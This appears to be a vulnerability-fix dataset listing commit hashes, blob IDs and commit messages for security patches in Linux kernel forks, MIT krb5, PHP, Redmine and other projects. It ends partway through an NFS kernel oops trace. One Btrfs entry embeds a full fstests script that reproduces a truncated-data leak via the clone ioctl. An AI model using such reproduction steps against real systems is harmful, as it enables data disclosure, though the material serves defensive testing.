    ad1f9232292d264506b16cb5b5bd8a625dc2e88d
    bbc90c05900251737d7c0cbbc7ec77a0526efb0c
    bf2bd40e5f2ac7cdf1291caf1350f686925039bf
    c53fbb3e0b8c6c8dd71558907945e9a5c0904ae3
    c5cf350ea8ce8747c7f66e1913a973f1238ccb42
    dbc3801b43ebb05c66e91e901de2f01ae41cb753
    f253c91383dacf1dfa4b89da4700dc946301d059
Projects:
    0-T-0_ps4-linux
Commit Message for cb3232138e37129e88240a98a1d2aba2187ff57c:
USB: serial: visor: fix crash on detecting device without write_urbs\n\nThe visor driver crashes in clie_5_attach() when a specially crafted USB device without bulk-out endpoint is detected. This fix adds a check that the device has proper configuration expected by the driver.\n\nReported-by: Ralf Spenneberg <ralf@spenneberg.net> Signed-off-by: Vladis Dronov <vdronov@redhat.com> Fixes: cfb8da8f69b8 ("USB: visor: fix initialisation of UX50/TH55 devices") Cc: stable <stable@vger.kernel.org> Signed-off-by: Johan Hovold <johan@kernel.org>

======================================================================
Commit With Fix: 
    84b9615ae7fe233c40a80bf749085caaef6f4919
File(s) In Commit: 
    index.php
Blob(s) In Commit: 
    5cea4cf870b650ff89dc10b94c83592d306b76ae
Blob(s) Before Fix: 
    3246744024e55f3a21163af2ff6c569b15b42e49
Projects:
    Tharre_void
Commit Message for 84b9615ae7fe233c40a80bf749085caaef6f4919:
Merge pull request #18 from g-sato/fix_security_bug\n\nSecurity fix

======================================================================
Commit With Fix: 
    4b2b64d5a6ebc84214755ebccd599baef7c1b798
File(s) In Commit: 
    arch/x86/kernel/kexec-bzimage64.c
Blob(s) In Commit: 
    61827eeb6881f429d2a7f625f541b6eaee4a05be
Blob(s) Before Fix: 
    2af478e3fd4e2a5c9565adbe781eb06ed9ca5b60
    e6ac3301106838fd57b7c321f6a687bb7e84bb30
Projects:
    0-T-0_ps4-linux
Commit Message for 4b2b64d5a6ebc84214755ebccd599baef7c1b798:
kexec/uefi: copy secure_boot flag in boot params across kexec reboot\n\nKexec reboot in case secure boot being enabled does not keep the secure boot mode in new kernel, so later one can load unsigned kernel via legacy kexec_load.  In this state, the system is missing the protections provided by secure boot. Adding a patch to fix this by retain the secure_boot flag in original kernel.\n\nsecure_boot flag in boot_params is set in EFI stub, but kexec bypasses the stub. Fixing this issue by copying secure_boot flag across kexec reboot.\n\nSigned-off-by: Dave Young <dyoung@redhat.com>

======================================================================
Commit With Fix: 
    eda98796aff0d9bf41094b06811f5def3b4c333c
File(s) In Commit: 
    drivers/media/platform/vivid/vivid-osd.c
Blob(s) In Commit: 
    e15eef6a94e5585ad93a0dc81dcde54563f1aff6
Blob(s) Before Fix: 
    084d346fb4c4f6f9c84f17f48a11bd5eea10799c
    1a89593b0c86ffe697e58560b7b4ad4b668af04c
    bbbc1b6938a56ba8fa91cb093bb46b70ffc5394f
    bdc380b14e0c47e73461ded4b16d01cbf484ed2d
    f3afc74f98eda336b4dd1b14c6061adc2dc88a6f
Projects:
    0-T-0_ps4-linux
Commit Message for eda98796aff0d9bf41094b06811f5def3b4c333c:
[media] media/vivid-osd: fix info leak in ioctl\n\nThe vivid_fb_ioctl() code fails to initialize the 16 _reserved bytes of struct fb_vblank after the ->hcount member. Add an explicit memset(0) before filling the structure to avoid the info leak.\n\nSigned-off-by: Salva Peiró <speirofr@gmail.com> Signed-off-by: Hans Verkuil <hans.verkuil@cisco.com> Signed-off-by: Mauro Carvalho Chehab <mchehab@osg.samsung.com>

======================================================================
Commit With Fix: 
    4b6184336ebb5c8dc1eae7f7ab46ee608a748b05
File(s) In Commit: 
    drivers/staging/dgnc/dgnc_mgmt.c
Blob(s) In Commit: 
    518fbd5e2d0e20159ba4b548b92e418b67c36858
Blob(s) Before Fix: 
    1c5ab3d007b00e126348cf0b3cace1b250b9a81f
    3ca473b47daf049eff42fcfb6f67d258bcc48cf4
    5544a8e7f4bc405195130417f31927f72cf42a59
    683c098391d9f3e9b9685896d744aca7f8d7c0c3
    883e2a84b342783f971dbd451bb6b9d60bf87b1a
    9ec3efe0a287affdd44d9b6864e9efd40e9c0eaf
    b13318a82fe1970fa64fb8d1856fc65db39539ec
    c4629d7c80b21bb72400e1074662438ce518192a
    c5b425bf6692a47160836c8e6bf1aca0b41b42b3
Projects:
    0-T-0_ps4-linux
Commit Message for 4b6184336ebb5c8dc1eae7f7ab46ee608a748b05:
staging/dgnc: fix info leak in ioctl\n\nThe dgnc_mgmt_ioctl() code fails to initialize the 16 _reserved bytes of struct digi_dinfo after the ->dinfo_nboards member. Add an explicit memset(0) before filling the structure to avoid the info leak.\n\nSigned-off-by: Salva Peiró <speirofr@gmail.com> Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>

======================================================================
Commit With Fix: 
    668a9bbe7033f3f475576209305eb57a54306d29
File(s) In Commit: 
    src/type/s2k.js
Blob(s) In Commit: 
    e4d0fab79b72e29ef9021ad8887542f5a4f50b06
Blob(s) Before Fix: 
    683d1e16c75999193ae849db923d01d0a38fd48a
Projects:
    053803_openpgpjs
Commit Message for 668a9bbe7033f3f475576209305eb57a54306d29:
Throw exception on unsupported S2K type.

======================================================================
Commit With Fix: 
    2e86ae5f81da11f11673d0546efb525af02b7786
File(s) In Commit: 
    libexfat/mount.c
Blob(s) In Commit: 
    f25d71d6152568c370d334b622fc1856d9b6b1ba
Blob(s) Before Fix: 
    7ccdd4eabdd2f128fe491d758a2ee2f143cf2769
Projects:
    8953caf_platform_external_exfat
Commit Message for 2e86ae5f81da11f11673d0546efb525af02b7786:
Check sector and cluster size before use.\n\nOtherwise malformed FS can cause heap corruption.

======================================================================
Commit With Fix: 
    950d9e0e4ee46efa41e791eac6cd55d2f558c3c9
File(s) In Commit: 
    textpattern/include/txp_article.php
Blob(s) In Commit: 
    a1de6a6ddb8cb82d33526cbbc2d7f7d0662120b0
Blob(s) Before Fix: 
    ff88604e8893c82034f5dda3ffb77386b6e92485
Projects:
    Acidburn0zzz_textpattern
Commit Message for 950d9e0e4ee46efa41e791eac6cd55d2f558c3c9:
Do not allow unprivileged authors to modify an existing article's markup setting.\n\nRefs #558.

======================================================================
Commit With Fix: 
    cbdb967af3d54993f5814f1cee0ed311a055377d
File(s) In Commit: 
    arch/x86/kvm/svm.c
Blob(s) In Commit: 
    1cc1ffca0d8c3fe9693a0b4f6d23cddfcc81e826
Blob(s) Before Fix: 
    183926483c3ac86127c4dffe6ac10d9e2423f33e
Projects:
    0-T-0_ps4-linux
Commit Message for cbdb967af3d54993f5814f1cee0ed311a055377d:
KVM: svm: unconditionally intercept #DB\n\nThis is needed to avoid the possibility that the guest triggers an infinite stream of #DB exceptions (CVE-2015-8104).\n\nVMX is not affected: because it does not save DR6 in the VMCS, it already intercepts #DB unconditionally.\n\nReported-by: Jan Beulich <jbeulich@suse.com> Cc: stable@vger.kernel.org Signed-off-by: Paolo Bonzini <pbonzini@redhat.com>

======================================================================
Commit With Fix: 
    77751427a1ff25b27d47a4c36b12c3c8667855ac
File(s) In Commit: 
    net/ipv6/addrconf.c
Blob(s) In Commit: 
    b6030025f41197efbcdfd1d8c013e469413550b5
Blob(s) Before Fix: 
    0169ccf5aa4fec8f691ea3bed77b4c7e5587d2a5
    0424e4e27414d3bd6c79f5094d0d3907e62b02f5
    0b239fc1816ed828862f19cdde0f08720a0b43ca
    0ba0866230c99367db4f3706b15cb2ed0ff91dbf
    17a025847999785f241206253622598541e770b0
    20dd073a81f73d02b58ec5c347c01d1018beefea
    3e118dfddd02a0c16051b49ffba0953daed54225
    5667b3003af9b51779ff322717e999282113c4b7
    6c7fa0853fc74ef179b00de52d78aecee342e18b
    725c763270a067e3945ec3056c4f5893cf9f7060
    98e4a63d72bb435e1ac1ae7cf2767072eed6db92
    ad235690684c97f873e0c24b774d5184055fe7e2
    d1ab6ab29a55c11e0570bb9854c524d9f21369fc
    dac94195a4b95efa31d78f125a877d9b98db9a05
    dae802c0af7c002df341d3dfe4ed94db6584118e
    f7c8bbeb27b704c0106f714d5a0677c27d3346e0
    fdbfeca36d6344c22db31886c3661796eb9e8f86
Projects:
    0-T-0_ps4-linux
Commit Message for 77751427a1ff25b27d47a4c36b12c3c8667855ac:
ipv6: addrconf: validate new MTU before applying it\n\nCurrently we don't check if the new MTU is valid or not and this allows one to configure a smaller than minimum allowed by RFCs or even bigger than interface own MTU, which is a problem as it may lead to packet drops.\n\nIf you have a daemon like NetworkManager running, this may be exploited by remote attackers by forging RA packets with an invalid MTU, possibly leading to a DoS. (NetworkManager currently only validates for values too small, but not for too big ones.)\n\nThe fix is just to make sure the new value is valid. That is, between IPV6_MIN_MTU and interface's MTU.\n\nNote that similar check is already performed at ndisc_router_discovery(), for when kernel itself parses the RA.\n\nSigned-off-by: Marcelo Ricardo Leitner <mleitner@redhat.com> Signed-off-by: Sabrina Dubroca <sd@queasysnail.net> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    b400b976d81140f6971132e94eb7657b5b0a2b87
File(s) In Commit: 
    lib/IPTables/Parse.pm
Blob(s) In Commit: 
    cbd2042cb352f1da1493f779733f6ba49b2aba06
Blob(s) Before Fix: 
    7c27b8b02ce68d07e032d714c46e23820550c776
Projects:
    mrash_fwsnort
Commit Message for b400b976d81140f6971132e94eb7657b5b0a2b87:
Don't use predictable names for temporary files\n\nThis allows an attacker on a multi-user system to set up symlinks to overwrite any file the current user has write access to.\n\nDon't recommend users of this module to use predictable names either.

======================================================================
Commit With Fix: 
    c096dde88ff02872ba35edc4dc403c80a7867b5c
File(s) In Commit: 
    app/views/timelog/_form.html.erb
Blob(s) In Commit: 
    0dbff35a7edf9e729577f37d52206e389ffa4437
Blob(s) Before Fix: 
    84fb9478733e0684c86ef2f2d36cc7d8643a3e34
Projects:
    01022012_redmine
Commit Message for c096dde88ff02872ba35edc4dc403c80a7867b5c:
Fixed that time logging form may disclose subjects of issues that are not visible (#21150).\n\nPatch by Holger Just.\n\ngit-svn-id: http://svn.redmine.org/redmine/trunk@14795 e93f8b46-1217-0410-a6f0-8f06a7374b81

======================================================================
Commit With Fix: 
    0305cd5f7fca85dae392b9ba85b116896eb7c1c7
File(s) In Commit: 
    fs/btrfs/inode.c
Blob(s) In Commit: 
    cbb4286490a1283b0d71bb4e26aad0987ec3b82e
Blob(s) Before Fix: 
    208db4e835f0feccb860a8536910f02b69aa1ef6
Projects:
    0-T-0_ps4-linux
Commit Message for 0305cd5f7fca85dae392b9ba85b116896eb7c1c7:
Btrfs: fix truncation of compressed and inlined extents\n\nWhen truncating a file to a smaller size which consists of an inline extent that is compressed, we did not discard (or made unusable) the data between the new file size and the old file size, wasting metadata space and allowing for the truncated data to be leaked and the data corruption/loss mentioned below. We were also not correctly decrementing the number of bytes used by the inode, we were setting it to zero, giving a wrong report for callers of the stat(2) syscall. The fsck tool also reported an error about a mismatch between the nbytes of the file versus the real space used by the file.\n\nNow because we weren't discarding the truncated region of the file, it was possible for a caller of the clone ioctl to actually read the data that was truncated, allowing for a security breach without requiring root access to the system, using only standard filesystem operations. The scenario is the following:\n\n   1) User A creates a file which consists of an inline and compressed       extent with a size of 2000 bytes - the file is not accessible to       any other users (no read, write or execution permission for anyone       else) \n\n   2) The user truncates the file to a size of 1000 bytes \n\n   3) User A makes the file world readable \n\n   4) User B creates a file consisting of an inline extent of 2000 bytes \n\n   5) User B issues a clone operation from user A's file into its own       file (using a length argument of 0, clone the whole range) \n\n   6) User B now gets to see the 1000 bytes that user A truncated from       its file before it made its file world readbale. User B also lost       the bytes in the range [1000, 2000[ bytes from its own file, but       that might be ok if his/her intention was reading stale data from       user A that was never supposed to be public.\n\nNote that this contrasts with the case where we truncate a file from 2000 bytes to 1000 bytes and then truncate it back from 1000 to 2000 bytes. In this case reading any byte from the range [1000, 2000[ will return a value of 0x00, instead of the original data.\n\nThis problem exists since the clone ioctl was added and happens both with and without my recent data loss and file corruption fixes for the clone ioctl (patch "Btrfs: fix file corruption and data loss after cloning inline extents").\n\nSo fix this by truncating the compressed inline extents as we do for the non-compressed case, which involves decompressing, if the data isn't already in the page cache, compressing the truncated version of the extent, writing the compressed content into the inline extent and then truncate it.\n\nThe following test case for fstests reproduces the problem. In order for the test to pass both this fix and my previous fix for the clone ioctl that forbids cloning a smaller inline extent into a larger one, which is titled "Btrfs: fix file corruption and data loss after cloning inline extents", are needed. Without that other fix the test fails in a different way that does not leak the truncated data, instead part of destination file gets replaced with zeroes (because the destination file has a larger inline extent than the source).\n\n  seq=`basename $0`   seqres=$RESULT_DIR/$seq   echo "QA output created by $seq"   tmp=/tmp/$$   status=1	# failure is the default!   trap "_cleanup  exit \$status" 0 1 2 3 15\n\n  _cleanup()   {       rm -f $tmp.*   }\n\n  # get standard environment, filters and checks   . ./common/rc   . ./common/filter\n\n  # real QA test starts here   _need_to_be_root   _supported_fs btrfs   _supported_os Linux   _require_scratch   _require_cloner\n\n  rm -f $seqres.full\n\n  _scratch_mkfs >>$seqres.full 2>&1   _scratch_mount "-o compress"\n\n  # Create our test files. File foo is going to be the source of a clone operation   # and consists of a single inline extent with an uncompressed size of 512 bytes,   # while file bar consists of a single inline extent with an uncompressed size of   # 256 bytes. For our test's purpose, it's important that file bar has an inline   # extent with a size smaller than foo's inline extent.   $XFS_IO_PROG -f -c "pwrite -S 0xa1 0 128"   \           -c "pwrite -S 0x2a 128 384" \           $SCRATCH_MNT/foo | _filter_xfs_io   $XFS_IO_PROG -f -c "pwrite -S 0xbb 0 256" $SCRATCH_MNT/bar | _filter_xfs_io\n\n  # Now durably persist all metadata and data. We do this to make sure that we get   # on disk an inline extent with a size of 512 bytes for file foo.   sync\n\n  # Now truncate our file foo to a smaller size. Because it consists of a   # compressed and inline extent, btrfs did not shrink the inline extent to the   # new size (if the extent was not compressed, btrfs would shrink it to 128   # bytes), it only updates the inode's i_size to 128 bytes.   $XFS_IO_PROG -c "truncate 128" $SCRATCH_MNT/foo\n\n  # Now clone foo's inline extent into bar.   # This clone operation should fail with errno EOPNOTSUPP because the source   # file consists only of an inline extent and the file's size is smaller than   # the inline extent of the destination (128 bytes < 256 bytes). However the   # clone ioctl was not prepared to deal with a file that has a size smaller   # than the size of its inline extent (something that happens only for compressed   # inline extents), resulting in copying the full inline extent from the source   # file into the destination file.   #   # Note that btrfs' clone operation for inline extents consists of removing the   # inline extent from the destination inode and copy the inline extent from the   # source inode into the destination inode, meaning that if the destination   # inode's inline extent is larger (N bytes) than the source inode's inline   # extent (M bytes), some bytes (N - M bytes) will be lost from the destination   # file. Btrfs could copy the source inline extent's data into the destination's   # inline extent so that we would not lose any data, but that's currently not   # done due to the complexity that would be needed to deal with such cases   # (specially when one or both extents are compressed), returning EOPNOTSUPP, as   # it's normally not a very common case to clone very small files (only case   # where we get inline extents) and copying inline extents does not save any   # space (unlike for normal, non-inlined extents).   $CLONER_PROG -s 0 -d 0 -l 0 $SCRATCH_MNT/foo $SCRATCH_MNT/bar\n\n  # Now because the above clone operation used to succeed, and due to foo's inline   # extent not being shinked by the truncate operation, our file bar got the whole   # inline extent copied from foo, making us lose the last 128 bytes from bar   # which got replaced by the bytes in range [128, 256[ from foo before foo was   # truncated - in other words, data loss from bar and being able to read old and   # stale data from foo that should not be possible to read anymore through normal   # filesystem operations. Contrast with the case where we truncate a file from a   # size N to a smaller size M, truncate it back to size N and then read the range   # [M, N[, we should always get the value 0x00 for all the bytes in that range.\n\n  # We expected the clone operation to fail with errno EOPNOTSUPP and therefore   # not modify our file's bar data/metadata. So its content should be 256 bytes   # long with all bytes having the value 0xbb.   #   # Without the btrfs bug fix, the clone operation succeeded and resulted in   # leaking truncated data from foo, the bytes that belonged to its range   # [128, 256[, and losing data from bar in that same range. So reading the   # file gave us the following content:   #   # 0000000 a1 a1 a1 a1 a1 a1 a1 a1 a1 a1 a1 a1 a1 a1 a1 a1   # *   # 0000200 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a   # *   # 0000400   echo "File bar's content after the clone operation:"   od -t x1 $SCRATCH_MNT/bar\n\n  # Also because the foo's inline extent was not shrunk by the truncate   # operation, btrfs' fsck, which is run by the fstests framework everytime a   # test completes, failed reporting the following error:   #   #  root 5 inode 257 errors 400, nbytes wrong\n\n  status=0   exit\n\nCc: stable@vger.kernel.org Signed-off-by: Filipe Manana <fdmanana@suse.com>

======================================================================
Commit With Fix: 
    f1a5fce791e2392d5a23a6d62ab65c481cdd6a66
File(s) In Commit: 
    administration/robots.php
Blob(s) In Commit: 
    51b8496b9481fa0746e2b8a02ae8cefe7a9acd51
Blob(s) Before Fix: 
    265e42588dc9ed8d0eab4b835635438ec60b95c3
Projects:
    ALTUN69_PHP-Fusion
Commit Message for f1a5fce791e2392d5a23a6d62ab65c481cdd6a66:
Added char checks to robots.txt\n\nAdded char checks to robots.txt

======================================================================
Commit With Fix: 
    b8edbda019eeb99da8663193e224efc9d1265dc7
File(s) In Commit: 
    src/core/coreuserinputhandler.cpp
Blob(s) In Commit: 
    73aac48ae3cb8cfcba99ec943ca0cb1e57ed955c
Blob(s) Before Fix: 
    05424a6b0b3355b727a9e1a4afc8d843ac3e48bd
    7887a929a2a525fb52cedf1734d913a21a408f5f
Projects:
    02JanDal_quassel
Commit Message for b8edbda019eeb99da8663193e224efc9d1265dc7:
Merge pull request #153 from elxa/fix-op-command-crashing-core\n\nFixes a crash of the core when executing "/op *" in a query.

======================================================================
Commit With Fix: 
    09ccfd238e5a0e670d8178cf50180ea81ae09ae1
File(s) In Commit: 
    drivers/net/ppp/pptp.c
Blob(s) In Commit: 
    597c53e0a2ecce6a7fecaaf5032006f31795b307
Blob(s) Before Fix: 
    01805319e1e0335a70f86109e058cac44d669ee0
    12a627fcc02c5b58645c690150bf6abb694a1a9c
    162464fe86bf7634fb9ac6c21ecd76e25beb10b6
    1aff970be33ec88ec8ff6781467155f68cf5b3b4
    1dc628ffce2b52a565354f060dca84467d67e4b9
    686f37daa262b180f5efed77152335e62364b4ef
    885dbdd9c39e0f9ea1101d7a5642fc52d6a081a7
    ae0905ed4a32b55183568e95512c6727458a9f96
    b910caef3a38a37cae5630530eb9404274dc4a9a
    c1c9293c2bbf1eecd638d8d6e428777951cdff9d
    e3bfbd4d01367fc32b063d3305b635006d3f9b03
    fc69e41d09506e96b38f067fa05175bd680fa36b
Projects:
    0-T-0_ps4-linux
Commit Message for 09ccfd238e5a0e670d8178cf50180ea81ae09ae1:
pptp: verify sockaddr_len in pptp_bind() and pptp_connect()\n\nReported-by: Dmitry Vyukov <dvyukov@gmail.com> Signed-off-by: Cong Wang <xiyou.wangcong@gmail.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    5233252fce714053f0151680933571a2da9cbfb4
File(s) In Commit: 
    net/bluetooth/sco.c
Blob(s) In Commit: 
    f52bcbf2e58cd8b8ded4c3d65c8dd9b87034b002
Blob(s) Before Fix: 
    15cb6c5508bc64e1056808e4f83e9d9653f5f441
    2209fd2ff2e325ddc15dae020e28214e9721ee40
    24fa3964b3c84da299287d6c913771c579d6a9a5
    30e5ea3f1ad311388bf7f95aec8f70cb88e8fab9
    3125ce670c2f241f446daae17a37fbcc5f485574
    316dd4e0af39dcb4746946b3904989680538072b
    3170190f83c48c5943dab9da00f784ed0e143eb5
    4322c833e74891d20a627f21e64cdedd67cd806f
    47ad737977b635b69149a4cc8f47834085f11470
    57f250c20e399851ca6998d9813dc60e3ffa3455
    5dc2f2126fac669a2f1b961efb8ce665768da2f2
    688a040c5626ed50a9568211aba1d16541006e88
    70c9ef29ab18b999fbf1d22f1d841455d77300de
    728e0c8dc8e74ccb134b8ed1d493ea8ee49bf49b
    76321b546e8426146dba242c281c2915464e7d6f
    77f4153bdb5e5ebe434487497d1e8d3ed0253cbf
    7ee9e4ab00f882f827f7b63361dc82a24ca72a23
    8611bc7bdd327993219d37a85ba7787afbe3387c
    8f0f9279eac9f72c0c15258edabbcbec6d3bf2b6
    96bd388d93a4aae145bfb207d26fbc3a90b9e0a8
    b586a3230247d06eb7daf7e84e9c4eddcb019f74
    c06dbd3938e881e45d575b586830d2bea9d580a0
    cd7d93d3ef7a024aa7166298b3c21ea4f01e6b60
    dbbbc0292bd0eb0e9f30280ea52e0bb6892410ef
    e7bd4eea575cff782401430147c9cdcc1a1ad6b0
    f315c8d0e43b594486cc3dd1be1433387601e7c3
    f6ab12907963fac3d5e3ed6bae46d10b28ee52db
    fe129663bd3f7faeb39f20d02a8425d525da071d
Projects:
    0-T-0_ps4-linux
Commit Message for 5233252fce714053f0151680933571a2da9cbfb4:
bluetooth: Validate socket address length in sco_sock_bind().\n\nSigned-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    b101a6bbd4f2181c360bd38e7683df4a03cba83e
File(s) In Commit: 
    Zend/zend_execute_API.c
Blob(s) In Commit: 
    fdffed34b275775084eeaf943a12c992edac2e0c
Blob(s) Before Fix: 
    965b08eb389dd2f01e2fba93214648e1ea74c8fc
    9979aac2560f92025fee9a29abd6831adfd2e311
    a230b9c27018bd07c1e7813a477c1c067142088a
    c9da46d819382e0ab48bcdd20057ba5bebec0c50
Projects:
    0014593_php-src
Commit Message for b101a6bbd4f2181c360bd38e7683df4a03cba83e:
Use format string

======================================================================
Commit With Fix: 
    df17a1224a3406f57477bcd372c61e04c0e5a5bb
File(s) In Commit: 
    src/lib/kadm5/kadm_rpc_xdr.c
Blob(s) In Commit: 
    ba670841056f1ede0929281e28e61e722e1fa990
Blob(s) Before Fix: 
    2bef8586312fc59c11b0b88122b53be0ecc82a6f
    6ccfcea3fb4c2895907e29d67fe312205ea380aa
Projects:
    3van_krb5
Commit Message for df17a1224a3406f57477bcd372c61e04c0e5a5bb:
Verify decoded kadmin C strings [CVE-2015-8629]\n\nIn xdr_nullstring(), check that the decoded string is terminated with a zero byte and does not contain any internal zero bytes.\n\nCVE-2015-8629:\n\nIn all versions of MIT krb5, an authenticated attacker can cause kadmind to read beyond the end of allocated memory by sending a string without a terminating zero byte.  Information leakage may be possible for an attacker with permission to modify the database.\n\n    CVSSv2 Vector: AV:N/AC:H/Au:S/C:P/I:N/A:N/E:POC/RL:OF/RC:C\n\nticket: 8341 (new) target_version: 1.14-next target_version: 1.13-next tags: pullup

======================================================================
Commit With Fix: 
    b863de7fbf080b15e347a736fdda0a82d42f4f6b
File(s) In Commit: 
    src/lib/kadm5/srv/svr_principal.c
Blob(s) In Commit: 
    1d4365c836fb43c3979f0292460e077f480335fa
Blob(s) Before Fix: 
    5b95fa3e13de925ad826016e86209e17ec40ef16
    7b74830fd3c91742f37f21e881c85725dc2e5dec
Projects:
    3van_krb5
Commit Message for b863de7fbf080b15e347a736fdda0a82d42f4f6b:
Check for null kadm5 policy name [CVE-2015-8630]\n\nIn kadm5_create_principal_3() and kadm5_modify_principal(), check for entry->policy being null when KADM5_POLICY is included in the mask.\n\nCVE-2015-8630:\n\nIn MIT krb5 1.12 and later, an authenticated attacker with permission to modify a principal entry can cause kadmind to dereference a null pointer by supplying a null policy value but including KADM5_POLICY in the mask.\n\n    CVSSv2 Vector: AV:N/AC:H/Au:S/C:N/I:N/A:C/E:POC/RL:OF/RC:C\n\nticket: 8342 (new) target_version: 1.14-next target_version: 1.13-next tags: pullup

======================================================================
Commit With Fix: 
    83ed75feba32e46f736fcce0d96a0445f29b96c2
File(s) In Commit: 
    src/kadmin/server/server_stubs.c
Blob(s) In Commit: 
    6ac797e2885f1a737b9de605bd1d19b363ea185a
Blob(s) Before Fix: 
    1879dc67ef79fdb715909d60e370701d1ef15cd9
Projects:
    3van_krb5
Commit Message for 83ed75feba32e46f736fcce0d96a0445f29b96c2:
Fix leaks in kadmin server stubs [CVE-2015-8631]\n\nIn each kadmind server stub, initialize the client_name and server_name variables, and release them in the cleanup handler.  Many of the stubs will otherwise leak the client and server name if krb5_unparse_name() fails.  Also make sure to free the prime_arg variables in rename_principal_2_svc(), or we can leak the first one if unparsing the second one fails.  Discovered by Simo Sorce.\n\nCVE-2015-8631:\n\nIn all versions of MIT krb5, an authenticated attacker can cause kadmind to leak memory by supplying a null principal name in a request which uses one.  Repeating these requests will eventually cause kadmind to exhaust all available memory.\n\n    CVSSv2 Vector: AV:N/AC:L/Au:S/C:N/I:N/A:C/E:POC/RL:OF/RC:C\n\nticket: 8343 (new) target_version: 1.14-next target_version: 1.13-next tags: pullup

======================================================================
Commit With Fix: 
    acff81ec2c79492b180fade3c2894425cd35a545
File(s) In Commit: 
    fs/overlayfs/inode.c
Blob(s) In Commit: 
    961284936917e69742f837463999c27e90defb43
Blob(s) Before Fix: 
    d9da5a4e93821ddbee9f2fb449666c207417e523
    ec0c2a050043afbb3eff4c7451930dc6d86006ec
Projects:
    0-T-0_ps4-linux
Commit Message for acff81ec2c79492b180fade3c2894425cd35a545:
ovl: fix permission checking for setattr\n\n[Al Viro] The bug is in being too enthusiastic about optimizing ->setattr() away - instead of "copy verbatim with metadata" + "chmod/chown/utimes" (with the former being always safe and the latter failing in case of insufficient permissions) it tries to combine these two.  Note that copyup itself will have to do ->setattr() anyway  _that_ is where the elevated capabilities are right.  Having these two ->setattr() (one to set verbatim copy of metadata, another to do what overlayfs ->setattr() had been asked to do in the first place) combined is where it breaks.\n\nSigned-off-by: Miklos Szeredi <miklos@szeredi.hu> Cc: <stable@vger.kernel.org> Signed-off-by: Al Viro <viro@zeniv.linux.org.uk>

======================================================================
Commit With Fix: 
    0d3181324c816bdf664ca5e1548dfe8eb05c54f8
File(s) In Commit: 
    htdocs/core/lib/functions.lib.php
Blob(s) In Commit: 
    81412531262cd4267f3d47536a92b1374487bac6
Blob(s) Before Fix: 
    c530f612d2959fa062eb00ffedfdf64a1be09b66
Projects:
    01viniciusmelo_dolibarr
Commit Message for 0d3181324c816bdf664ca5e1548dfe8eb05c54f8:
FIX #2857, #4291 & #4341 Escape GETPOST alpha data by default\n\nThis should mitigate most HTML injections allowing XSS.

======================================================================
Commit With Fix: 
    6058483d9fbc1b904d5ae7cfea47bfcde5c5b559
File(s) In Commit: 
    src/dns.cpp
Blob(s) In Commit: 
    14305ccab2f49a2a4e94f94ee67dc543c34e92c2
Blob(s) Before Fix: 
    63bde0eccb46e5819b213d33f71df21f8d4cf32a
    75e5731fe93edac1951162665719424370b9b79f
Projects:
    0x277F_inspircd
Commit Message for 6058483d9fbc1b904d5ae7cfea47bfcde5c5b559:
Reject replies to DNS PTR requests that contain invalid characters\n\nFixes issue #1033 reported by @ping86

======================================================================
Commit With Fix: 
    18e3b739fdc826481c6a1335ce0c5b19b3d415da
File(s) In Commit: 
    fs/nfs/nfs4proc.c
Blob(s) In Commit: 
    43bace809be7dfb5c23c893ff3ae0d22b42efffa
Blob(s) Before Fix: 
    15ee8bd99b6156374df907201e0aa5cc7ca0d39c
Projects:
    0-T-0_ps4-linux
Commit Message for 18e3b739fdc826481c6a1335ce0c5b19b3d415da:
NFS: Fix a NULL pointer dereference of migration recovery ops for v4.2 client\n\n---Steps to Reproduce-- <nfs-server> # cat /etc/exports /nfs/referal  *(rw,insecure,no_subtree_check,no_root_squash,crossmnt) /nfs/old      *(ro,insecure,subtree_check,root_squash,crossmnt)\n\n<nfs-client> # mount -t nfs nfs-server:/nfs/ /mnt/ # ll /mnt/*/\n\n<nfs-server> # cat /etc/exports /nfs/referal   *(rw,insecure,no_subtree_check,no_root_squash,crossmnt,refer=/nfs/old/@nfs-server) /nfs/old       *(ro,insecure,subtree_check,root_squash,crossmnt) # service nfs restart\n\n<nfs-client> # ll /mnt/*/    --->>>>> oops here\n\n[ 5123.102925] BUG: unable to handle kernel NULL pointer dereference at           (null) [ 5123.103363] IP: [<ffffffffa03ed38b>] nfs4_proc_get_locations+0x9b/0x120 [nfsv4] [ 5123.103752] PGD 587b9067 PUD 3cbf5067 PMD 0 [ 5123.104131] Oops: 0000 [#1] [ 5123.104529] Modules linked in: nfsv4(OE) nfs(OE) fscache(E) nfsd(OE) xfs libcrc32c iscsi_tcp libiscsi_tcp libiscsi scsi_transport_iscsi coretemp crct10dif_pclmul crc32_pclmul crc32c_intel ghash_clmulni_intel ppdev vmw_balloon parport_pc parport i2c_piix4 shpchp auth_rpcgss nfs_acl vmw_vmci lockd grace sunrpc vmwgfx drm_kms_helper ttm drm mptspi serio_raw scsi_transport_spi e1000 mptscsih mptbase ata_generic pata_acpi [last unloaded: nfsd] [ 5123.105887] CPU: 0 PID: 15853 Comm: ::1-manager Tainted: G           OE   4.2.0-rc6+ #214 [ 5123.106358] Hardware name: VMware, Inc. VMware Virtual Platform/440BX Desktop Reference Platform, BIOS 6.00 05/20/2014 [ 5123.106860] task: ffff88007620f300 ti: ffff88005877c000 task.ti: ffff88005877c000 [ 5123.107363] RIP: 0010:[<ffffffffa03ed38b>]  [<ffffffffa03ed38b>] nfs4_proc_get_locations+0x9b/0x120 [nfsv4] [ 5123.107909] RSP: 0018:ffff88005877fdb8  EFLAGS: 00010246 [ 5123.108435] RAX: ffff880053f3bc00 RBX: ffff88006ce6c908 RCX: ffff880053a0d240 [ 5123.108968] RDX: ffffea0000e6d940 RSI: ffff8800399a0000 RDI: ffff88006ce6c908 [ 5123.109503] RBP: ffff88005877fe28 R08: ffffffff81c708a0 R09: 0000000000000000 [ 5123.110045] R10: 00000000000001a2 R11: ffff88003ba7f5c8 R12: ffff880054c55800 [ 5123.110618] R13: 0000000000000000 R14: ffff880053a0d240 R15: ffff880053a0d240 [ 5123.111169] FS:  0000000000000000(0000) GS:ffffffff81c27000(0000) knlGS:0000000000000000 [ 5123.111726] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033 [ 5123.112286] CR2: 0000000000000000 CR3: 0000000054cac000 CR4: 00000000001406f0 [ 5123.112888] Stack: [ 5123.113458]  ffffea0000e6d940 